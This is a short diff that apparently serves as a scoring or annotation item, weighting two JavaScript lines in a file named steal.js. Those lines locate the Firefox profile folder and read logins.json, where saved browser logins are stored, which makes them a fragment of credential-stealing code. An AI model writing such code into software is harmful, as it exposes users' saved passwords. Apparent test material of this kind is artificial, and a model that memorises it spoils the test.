@@ -1,0 +1,6 @@
+# path: steal.js
+# lines: 1, 2
+# weight: 40
+# ---
+const p = path.join(home, "AppData/Roaming/Mozilla/Firefox/Profiles");
+fs.readFileSync(path.join(p, "logins.json"));
